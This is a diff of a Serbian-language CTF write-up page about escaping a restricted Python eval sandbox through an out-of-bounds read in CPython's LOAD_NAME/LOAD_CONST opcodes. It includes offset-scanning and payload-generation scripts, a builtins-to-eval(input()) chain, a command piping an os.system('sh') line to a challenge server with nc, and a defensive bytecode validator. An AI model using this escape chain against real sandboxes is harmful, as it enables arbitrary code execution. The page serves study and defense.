@@ -1,45 +1,43 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-{{#include ../../../banners/hacktricks-training.md}}
-
-**Ove informacije su preuzete** [**iz ovog writeup-a**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>
+Ova stranica prilagođava originalni Splitline-ov writeup i exploit chain za HITCON CTF 2022 „V O I D“.<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Možemo koristiti OOB read funkcionalnost u LOAD_NAME / LOAD_CONST opcode-u da bismo dobili neki simbol iz memorije. To znači da možemo koristiti trik poput `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` da bismo dobili željeni simbol (kao što je naziv funkcije).
+Operand `LOAD_NAME` ili `LOAD_CONST` može da čita izvan namerno skraćenog `co_names` ili `co_consts` tuple-a. U ovom challenge-u koriste se nedostižna dummy imena dok obližnji unos ne sadrži koristan atribut kao što je `__getattribute__`.<sup>[[1]](#references)</sup>
 
-Zatim samo kreirajte svoj exploit.
+Preostali payload ponovo koristi tako pronađeno ime za izgradnju sandbox escape-a.<sup>[[1]](#references)</sup>
 
-### Overview <a href="#overview-1" id="overview-1"></a>
+### Pregled <a href="#overview-1" id="overview-1"></a>
 
-Source code je prilično kratak i sadrži samo 4 reda!
+Wrapper za challenge je kratak i kompajlira jedan izraz pre njegovog evaluiranja:<sup>[[1]](#references)</sup>
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
-print(eval(code, {'__builtins__': {}}))1234
+print(eval(code, {'__builtins__': {}}))
 ```
-Možete uneti proizvoljan Python code, koji će biti kompajliran u [Python code object](https://docs.python.org/3/c-api/code.html). Međutim, `co_consts` i `co_names` tog code object-a biće zamenjeni praznom tuple vrednošću pre nego što se taj code object prosledi funkciji `eval`.
+Ulaz se kompajlira u Python code object, a zatim wrapper zamenjuje njegove `co_consts` i `co_names` praznim tupleovima pre pozivanja `eval`.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Na ovaj način, svi izrazi koji sadrže consts (npr. brojeve, stringove itd.) ili names (npr. promenljive, funkcije) mogu na kraju izazvati segmentation fault.
+Svaka generisana instrukcija koja i dalje indeksira jednu od tih tabela može srušiti interpreter ili otkriti pokazivač na susedni objekat, u zavisnosti od build-a.<sup>[[1]](#references)</sup>
 
-### Čitanje van granica <a href="#out-of-bound-read" id="out-of-bound-read"></a>
+### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
 Kako dolazi do segfault-a?
 
-Počnimo jednostavnim primerom: `[a, b, c]` može biti kompajliran u sledeći bytecode.
+Za list expression kao što je `[a, b, c]`, kompajler generiše `LOAD_NAME` instrukcije sa uzastopnim operandima:<sup>[[1]](#references)[[2]](#references)</sup>
 ```
 1           0 LOAD_NAME                0 (a)
 2 LOAD_NAME                1 (b)
 4 LOAD_NAME                2 (c)
 6 BUILD_LIST               3
-8 RETURN_VALUE12345
+8 RETURN_VALUE
 ```
-Ali šta ako `co_names` postane prazan tuple? Opcode `LOAD_NAME 2` se i dalje izvršava i pokušava da pročita vrednost sa memorijske adrese na kojoj je prvobitno trebalo da se nalazi. Da, ovo je „feature“ za out-of-bound read.
+Ako se `co_names` zameni sa `()`, bytecode i dalje sadrži `LOAD_NAME 2`; neprovereni pristup tuple-u zato može da preuzme pointer izvan tuple-a umesto da podigne `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>
 
-Osnovni koncept rešenja je jednostavan. Neki opcode-ovi u CPython-u, na primer `LOAD_NAME` i `LOAD_CONST`, ranjivi su (?) na OOB read.
+`LOAD_NAME` i `LOAD_CONST` su osnovne primitive ovde: njihovi celobrojni operandi biraju stavke u `co_names` i `co_consts`, redom.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Oni preuzimaju objekat sa indeksa `oparg` iz tuple-a `consts` ili `names` (to su, u pozadini, nazivi za `co_consts` i `co_names`). Možemo pogledati sledeći kratki isečak o `LOAD_CONST` da bismo videli šta CPython radi kada obrađuje opcode `LOAD_CONST`.
+U CPython dispatch-u, `LOAD_CONST` preuzima izabranu stavku tuple-a i stavlja je na stek; release build-ovi koriste neprovereni tuple accessor:<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,23 +45,24 @@ PyObject *value = GETITEM(consts, oparg);
 Py_INCREF(value);
 PUSH(value);
 FAST_DISPATCH();
-}1234567
+}
 ```
-Na ovaj način možemo da koristimo OOB feature da dobijemo `name` sa proizvoljnog memorijskog pomeraja. Da biste utvrdili koji `name` je u pitanju i koji je njegov pomeraj, samo nastavite da pokušavate `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... I mogli biste da pronađete nešto kod vrednosti `oparg > 700`. Naravno, možete da pokušate i da koristite gdb kako biste pogledali raspored memorije, ali ne mislim da bi to bilo jednostavnije?
+Ispitajte sve veće operande `LOAD_NAME` na ciljnom interpreteru kako biste mapirali korisne unose. Splitline je u okruženju izazova uočio korisne offsete iznad 700, ali raspored zavisi od build-a; debugger može pomoći pri pregledu okolne memorije.<sup>[[1]](#references)</sup>
 
 ### Generisanje Exploit-a <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Kada dobijemo te korisne pomeraje za names / consts, kako _možemo_ da dobijemo name / const sa tog pomeraja i iskoristimo ga? Evo jednog trika:\
-Pretpostavimo da možemo da dobijemo `__getattribute__` name sa pomeraja 5 (`LOAD_NAME 5`) uz `co_names=()`, a zatim samo uradimo sledeće:
+Kada offset daje korisno ime, postavite lookup van opsega u nedostižan izraz i referencirajte isti `co_names` slot iz dostupnog pristupa atributu.<sup>[[1]](#references)</sup>
+
+Na primer, ako offset 5 daje `__getattribute__`, zadržite to ime na slotu 5 dok false grana obavlja korisni lookup:<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
-]1234
+]
 ```
-> Imajte na umu da nije neophodno nazvati ga `__getattribute__`; možete ga nazvati kraćim ili neobičnijim imenom.
+> Oporavljeni tekst ne mora biti `__getattribute__`; bilo koji identifikator koji služi payloadu može zauzeti taj slot.<sup>[[1]](#references)</sup>
 
-Razlog možete razumeti jednostavnim pregledom njegovog bytecode-a:
+Kompajler ponovo koristi jedan `co_names` slot za ponovljena pojavljivanja istog imena, kao što prikazuje disassembly:<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -78,11 +77,11 @@ Razlog možete razumeti jednostavnim pregledom njegovog bytecode-a:
 20 BUILD_LIST               0
 >>   22 LOAD_ATTR                5 (__getattribute__)
 24 BUILD_LIST               1
-26 RETURN_VALUE1234567891011121314
+26 RETURN_VALUE
 ```
-Imajte na umu da `LOAD_ATTR` takođe preuzima ime iz `co_names`. Python učitava imena sa istog offseta ako je ime isto, tako da se drugi `__getattribute__` i dalje učitava sa offset=5. Koristeći ovu funkcionalnost, možemo koristiti proizvoljno ime čim se ono nalazi u obližnjoj memoriji.
+Pošto `LOAD_ATTR` takođe razrešava svoje ime preko `co_names`, dostupna grana može ponovo da iskoristi taj slot; pakovani operandi u novijim verzijama CPython-a opisani su u napomenama o verzijama u nastavku.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Generisanje brojeva trebalo bi da bude jednostavno:
+Mali nenegativni celi brojevi mogu se dobiti iz boolean izraza bez konstanti:<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
@@ -91,9 +90,9 @@ Generisanje brojeva trebalo bi da bude jednostavno:
 
 ### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Nisam koristio consts zbog ograničenja dužine.
+Originalni exploit koristio je imena umesto konstanti kako bi ostao u okviru ograničenja dužine izazova.<sup>[[1]](#references)</sup>
 
-Najpre, evo script-a koji će nam pomoći da pronađemo te offset-e imena.
+Ova pomoćna funkcija skenira potencijalne pomeraje imena konstruisanjem code objekta sa praznim `co_names` tuple-om.<sup>[[1]](#references)</sup>
 ```python
 from types import CodeType
 from opcode import opmap
@@ -126,9 +125,9 @@ ret = eval(c, {'__builtins__': MockBuiltins()})
 if ret:
 print(f'{n}: {ret}')
 
-# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
+# for i in $(seq 0 10000); do python find.py $i ; done
 ```
-A sledeće služi za generisanje pravog Python exploit-a.
+Generator u nastavku mapira oporavljene offsete na imena i generiše payload na nivou izvornog koda.<sup>[[1]](#references)</sup>
 ```python
 import sys
 import unicodedata
@@ -205,7 +204,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-U osnovi radi sledeće stvari; za te stringove ih dobijamo iz metode `__dir__`:
+Na visokom nivou, generisani payload dobavlja globalni prostor imena funkcije, povrati `builtins` i pozove `eval(input())`.<sup>[[1]](#references)</sup>
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -220,18 +219,19 @@ builtins['eval'](builtins['input']())
 ```
 ---
 
-### Napomene o verzijama i pogođenim opcode-ovima (Python 3.11–3.13)
+### Beleške o verzijama i pogođenim opcode-ovima (Python 3.11–3.13)
 
-- CPython bytecode i dalje indeksira tuple-ove `co_consts` i `co_names` pomoću celobrojnih operanada. Ako napadač može da natera ove tuple-ove da budu prazni (ili manji od najvećeg indeksa koji bytecode koristi), interpreter će izvršiti čitanje memorije van granica za taj indeks, čime se dobija proizvoljni PyObject pointer iz obližnje memorije. Relevantni opcode-ovi obuhvataju najmanje:
-- `LOAD_CONST consti` → čita `co_consts[consti]`.
-- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → čitaju names iz `co_names[...]` (za 3.11+ imajte na umu da `LOAD_ATTR`/`LOAD_GLOBAL` čuvaju flag bitove u najnižem bitu; stvarni indeks je `namei >> 1`). Pogledajte dokumentaciju za disassembler radi precizne semantike za svaku verziju. [Python dis docs].<sup>[[2]](#references)</sup>
-- Python 3.11+ je uveo adaptive/inline caches koji dodaju skrivene `CACHE` unose između instrukcija. Ovo ne menja OOB primitive; samo znači da, ako ručno pravite bytecode, morate uzeti u obzir te cache unose prilikom izgradnje `co_code`.
+- Na CPython 3.11–3.13, instrukcije i dalje koriste celobrojne operande za indeksiranje tabela konstanti i imena code objekta. Ako je bilo koja od tih torki kraća od referenciranog indeksa, pristup bez provere može pročitati susedni pokazivač na objekat i izazvati crash ili raditi nad njim; tačno ponašanje zavisi od build-a interpreter-a.<sup>[[2]](#references)[[3]](#references)</sup>
+- `LOAD_CONST consti` i (3.12+) `RETURN_CONST consti` čitaju `co_consts[consti]`.<sup>[[2]](#references)</sup>
+- Direktni korisnici tabele imena uključuju `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` i (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
+- `LOAD_GLOBAL namei` i `LOAD_ATTR namei` koriste `co_names[namei >> 1]`; niži bit kontroliše dokumentovano NULL/method ponašanje. (3.12+) `LOAD_SUPER_ATTR namei` koristi `co_names[namei >> 2]` i pakuje dva flag-a u svoje niže bitove.<sup>[[2]](#references)</sup>
+- Python 3.11+ je uveo adaptive/inline caches koji dodaju skrivene `CACHE` unose između instrukcija. Ručno kreirani bytecode mora uzeti u obzir te unose prilikom izgradnje `co_code`.<sup>[[2]](#references)</sup>
 
-Praktična posledica: tehnika na ovoj stranici i dalje funkcioniše na CPython 3.11, 3.12 i 3.13 kada možete da kontrolišete code object (npr. preko `CodeType.replace(...)`) i smanjite `co_consts`/`co_names`.
+Praktična posledica: layout bytecode-a i pronađeni offset-i zavise od izdanja i build-a. Testirajte tehniku i svaki generisani payload u odnosu na ciljnu CPython verziju pre nego što se oslonite na njih.<sup>[[2]](#references)</sup>
 
-### Brzi skener za korisne OOB indekse (kompatibilan sa 3.11+/3.12+)
+### Brzi scanner za korisne OOB indekse (kompatibilan sa 3.11+/3.12+)
 
-Ako preferirate da direktno iz bytecode-a ispitujete zanimljive objekte umesto da ih tražite iz high-level source-a, možete generisati minimalne code objects i brute force-ovati indekse. Pomoćna funkcija u nastavku automatski ubacuje inline caches kada je to potrebno.
+Ako preferirate da direktno iz bytecode-a tražite zanimljive objekte umesto iz high-level izvornog koda, možete generisati minimalne code objekte i brute-force-ovati indekse. Pomoćni alat u nastavku umeće inline cache-ove u skladu sa `dis` metapodacima ciljnog interpreter-a.<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -271,12 +271,12 @@ if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
 Napomene
-- Da biste umesto toga ispitivali names, zamenite `LOAD_CONST` sa `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` i prilagodite korišćenje stack-a u skladu s tim.
-- Koristite `EXTENDED_ARG` ili više bajtova za `arg` da biste po potrebi došli do indeksa >255. Kada pravite pomoću `dis`, kao iznad, kontrolišete samo niži bajt; za veće indekse konstruišite raw bytes sami ili raspodelite napad kroz više učitavanja.
+- Da biste umesto toga ispitali imena, zamenite `LOAD_CONST` sa `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` i prilagodite korišćenje steka i upakovani operand za ciljni opcode.<sup>[[2]](#references)</sup>
+- Koristite `EXTENDED_ARG` ili više bajtova za `arg` da biste po potrebi dosegli indekse >255. Ovaj pomoćni kod emituje samo niži bajt operanda, pa veći indeksi zahtevaju konstrukciju sirovih bajtova ili višestruka učitavanja.<sup>[[2]](#references)</sup>
 
-### Minimalni bytecode-only RCE obrazac (co_consts OOB → builtins → eval/input)
+### Minimalni RCE obrazac zasnovan samo na bytecode-u (co_consts OOB → builtins → eval/input)
 
-Kada identifikujete `co_consts` indeks koji se razrešava u builtins modul, možete rekonstruisati `eval(input())` bez ikakvog `co_names` manipulisanjem stack-a:
+Kada identifikujete `co_consts` indeks koji se razrešava u modul builtins, možete rekonstruisati `eval(input())` bez `co_names` manipulisanjem stekom. Materijal zvaničnog B01lers CTF 2024 `awpcode` dokumentuje isti OOB-read obrazac.<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,31 +285,37 @@ Kada identifikujete `co_consts` indeks koji se razrešava u builtins modul, mož
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-Ovaj pristup je koristan u izazovima koji vam daju direktnu kontrolu nad `co_code`, uz nametanje `co_consts=()` i `co_names=()` (npr. BCTF 2024 „awpcode“). Izbegava trikove na nivou izvornog koda i održava veličinu payload-a malom, koristeći bytecode operacije nad stekom i konstruktore tuple-a.
+Ovaj pristup koji koristi samo stek koristan je kada vam challenge daje direktnu kontrolu nad `co_code`, uz nametnuto `co_consts=()` i `co_names=()`; izbegava trikove na nivou izvornog koda i može održati payload malim korišćenjem bytecode operacija nad stekom i tuple buildera.<sup>[[4]](#references)</sup>
 
-### Defanzivne provere i mitigacije za sandbox-e
+### Odbrambene provere i mitigacije za sandboxes
 
-Ako pišete Python „sandbox“ koji kompajlira/izvršava nepouzdan kod ili manipuliše code objektima, nemojte se oslanjati na CPython da proverava granice tuple indeksa koje koristi bytecode. Umesto toga, sami validirajte code objekte pre njihovog izvršavanja.
+Ako pišete Python sandbox koji kompajlira ili izvršava nepouzdan kod, nemojte se oslanjati na CPython da proverava granice tuple indeksa koje koristi bytecode. Validirajte code objekte pre njihovog izvršavanja.<sup>[[2]](#references)[[3]](#references)</sup>
 
-Praktični validator (odbacuje OOB pristup objektima `co_consts`/`co_names`)
+Praktični validator (odbacuje OOB pristup co_consts/co_names).<sup>[[2]](#references)</sup>
 ```python
 import dis
 
 def max_name_index(code):
 max_idx = -1
+direct_name_ops = {
+"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
+"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
+"LOAD_FROM_DICT_OR_GLOBALS",
+}
 for ins in dis.get_instructions(code):
-if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
-"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
+if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
 namei = ins.arg or 0
-# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
-if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
+# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
+if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
 namei >>= 1
+elif ins.opname == "LOAD_SUPER_ATTR":
+namei >>= 2
 max_idx = max(max_idx, namei)
 return max_idx
 
 def max_const_index(code):
 return max([ins.arg for ins in dis.get_instructions(code)
-if ins.opname == "LOAD_CONST"] + [-1])
+if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])
 
 def validate_code_object(code: type((lambda:0).__code__)):
 if max_const_index(code) >= len(code.co_consts):
@@ -324,12 +330,14 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # eval(c, {'__builtins__': {}})
 ```
 Dodatne ideje za ublažavanje
-- Nemojte dozvoliti proizvoljan `CodeType.replace(...)` nad nepouzdanim ulazom ili uvedite stroge strukturne provere rezultujućeg code object-a.
-- Razmotrite pokretanje nepouzdanog koda u odvojenom procesu uz sandboxing na nivou OS-a (seccomp, job objects, containers), umesto oslanjanja na CPython semantiku.
+- Ne dozvolite proizvoljan `CodeType.replace(...)` nad nepouzdanim ulazom ili uvedite stroge strukturne provere rezultujućeg code object-a.
+- Razmotrite pokretanje nepouzdanog koda u odvojenom procesu sa sandboxing-om na nivou OS-a (seccomp, job objects, containers), umesto oslanjanja na semantiku CPython-a.
 
-## Reference
+## References
 
-- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (origin of this technique and high-level exploit chain)](https://blog.splitline.tw/hitcon-ctf-2022/)
-- [2] [Python disassembler docs (indices semantics for LOAD_CONST/LOAD_NAME/etc., and 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags)](https://docs.python.org/3.13/library/dis.html)
-
+- [1] [Splitline-ov writeup za HITCON CTF 2022 „V O I D“ (poreklo ove tehnike i exploit chain visokog nivoa)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [2] [Python 3.13 `dis` dokumentacija (bytecode indeksi, packed name operandi i inline caches)](https://docs.python.org/3.13/library/dis.html)
+- [3] [CPython 3.13.5 tuple-access makroi (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
+- [4] [Writeup za B01lers CTF 2024 `awpcode` challenge (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
+- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
 {{#include ../../../banners/hacktricks-training.md}}
